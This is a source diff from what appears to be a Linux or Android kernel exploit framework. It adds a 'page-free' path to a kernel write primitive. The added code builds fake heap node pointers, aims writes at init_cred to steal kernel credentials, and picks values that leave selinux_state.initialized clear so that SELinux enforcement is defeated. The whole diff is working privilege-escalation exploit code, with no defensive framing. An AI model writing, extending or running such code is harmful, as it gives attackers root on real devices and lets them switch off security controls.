@@ -473,6 +473,39 @@ namespace ghostlock::support {
         post_ctx.memfds.assign(mm_objs_per_slab, 0);
     }
 
+    /* Page-free Stage 1/3: W1's value source. A profile that states
+     * `w1_scratch.image` writes the scratch alias through the same +0x100
+     * construction the page value used, so W1's write is identical apart from
+     * where its value comes from. Returns 0 when a stated scratch has no
+     * direct-map alias: the caller must refuse rather than fall back to a page
+     * the profile said not to use. `*out` stays 0 when the request is not W1's
+     * shape or the profile states no scratch (the page path). */
+    static int32_t w1_scratch_value(const memory::WriteRequest &request,
+                                    uintptr_t *out) {
+        *out = 0;
+        if (request.mode != memory::WriteMode::Zero || !request.preserve_child) return 1;
+        const std::optional<uint64_t> scratch_image =
+                session::g_exploit_session.profile.w1_scratch_image();
+        if (!scratch_image.has_value()) return 1;
+        const uintptr_t scratch_va =
+                kernel::KIMAGE_TEXT_BASE + static_cast<uintptr_t>(*scratch_image);
+        const uintptr_t scratch_alias =
+                session::g_exploit_session.addresses.data_alias(scratch_va);
+        if (scratch_alias == 0) {
+            pr_error("W1 scratch +0x%llx has no direct-map alias; refusing "
+                     "the page value (absent would keep the page path)\n",
+                     static_cast<unsigned long long>(*scratch_image));
+            return 0;
+        }
+        *out = scratch_alias + 0x100;
+        pr_info("w1_value_source=scratch image=+0x%llx alias=0x%llx "
+                "value=0x%llx\n",
+                static_cast<unsigned long long>(*scratch_image),
+                static_cast<unsigned long long>(scratch_alias),
+                static_cast<unsigned long long>(*out));
+        return 1;
+    }
+
     int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
         memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);
 
@@ -491,10 +524,22 @@ namespace ghostlock::support {
         uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
         uintptr_t credential_fops =
                 payload_base + (tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF);
+        /* Page-free Stage 1: W1's value source. A profile that states
+         * `w1_scratch.image` writes the scratch alias through the same +0x100
+         * construction as the page value; everything else on this page stays as
+         * it was (the page is still prepared at this stage). */
+        uintptr_t zero_value_override = 0;
+        if (request && !w1_scratch_value(*request, &zero_value_override)) return 0;
+        if (zero_value_override == 0 && request &&
+            request->mode == memory::WriteMode::Zero && request->preserve_child) {
+            pr_info("w1_value_source=page page=0x%zx value=0x%zx\n", base,
+                    static_cast<size_t>(base + 0x100));
+        }
         memory::PayloadWriteLayout write_layout = payload_write_layout(
             request, base, default_fops, credential_fops,
             session::g_exploit_session.addresses.
-            data_alias(session::g_exploit_session.addresses.init_cred_image_addr()));
+            data_alias(session::g_exploit_session.addresses.init_cred_image_addr()),
+            zero_value_override);
         (session::g_exploit_session.heap.current.fake_parent) = write_layout.parent;
         (session::g_exploit_session.heap.current.fake_right) = write_layout.right;
         (session::g_exploit_session.heap.current.fake_left) = write_layout.left;
@@ -952,6 +997,53 @@ namespace ghostlock::support {
         return base;
     }
 
+    bool page_free_run(void) {
+        return route::page_free(session::g_exploit_session.profile);
+    }
+
+    const char *page_free_reason(void) {
+        return route::page_free_reason(session::g_exploit_session.profile);
+    }
+
+    /* Page-free Stage 3: install the write layout the page path derives, with
+     * no page behind it. Every page-derived verdict field is zeroed first, so a
+     * route that still reads one would fault instead of silently using a stale
+     * page; the routes skip their page guards in this mode instead. The layout
+     * itself is request-derived and needs no page: W1/W1p carry the scratch
+     * alias, W2 carries init_cred, and leaf writes carry target - 8. */
+    int32_t prepare_page_free_context(const memory::WriteRequest &request) {
+        auto &page = session::g_exploit_session.heap.current;
+        page.base = 0;
+        page.last_mm_struct = 0;
+        page.fake_lock = 0;
+        page.fake_w0 = 0;
+        page.fake_task = 0;
+        page.fake_fops = 0;
+
+        uintptr_t zero_value_override = 0;
+        if (!w1_scratch_value(request, &zero_value_override)) return 0;
+        if (request.mode == memory::WriteMode::Zero && request.preserve_child &&
+            zero_value_override == 0) {
+            /* A value-carrying write with no value source: page-free cannot
+             * produce it, and the page is gone by contract. */
+            pr_error("page-free write has no value source (zero/preserve_child "
+                     "without w1_scratch.image)\n");
+            return 0;
+        }
+        const memory::PayloadWriteLayout write_layout = memory::payload_write_layout(
+            &request, /*page_base=*/0, /*default_fops=*/0, /*credential_fops=*/0,
+            session::g_exploit_session.addresses.data_alias(
+                session::g_exploit_session.addresses.init_cred_image_addr()),
+            zero_value_override);
+        page.fake_parent = write_layout.parent;
+        page.fake_right = write_layout.right;
+        page.fake_left = write_layout.left;
+        pr_info("page-free write target=0x%016zx preserve_child=%d value=0x%016zx\n",
+                static_cast<size_t>(request.target), request.preserve_child,
+                static_cast<size_t>(write_layout.right));
+        return 1;
+    }
+
     uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
         uint32_t max_attempts = session::g_exploit_session.profile.heap_prepare_max_attempts();
         struct timespec t_good;
@@ -974,12 +1066,15 @@ namespace ghostlock::support {
                     .left = (session::g_exploit_session.heap.current.fake_left),
                     .fops = (session::g_exploit_session.heap.current.fake_fops),
                 };
+                const uint32_t init_off =
+                        session::g_exploit_session.profile.selinux_initialized_offset();
                 if (!payload_write_layout_matches_request(&request, &layout)) {
                     pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                                request.preserve_child, layout.right);
-                } else if (!payload_write_layout_accepts_page(&request, &layout)) {
-                    pr_warning("page %016zx stores an even byte over "
-                               "selinux_state.initialized; taking another\n", base);
+                } else if (!payload_write_layout_accepts_page(&request, &layout, init_off)) {
+                    pr_warning("W1 value %016zx leaves selinux_state.initialized "
+                               "(byte %u) even; taking another page\n",
+                               layout.right, init_off);
                 } else {
                     pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                             ms_since(&t_good));
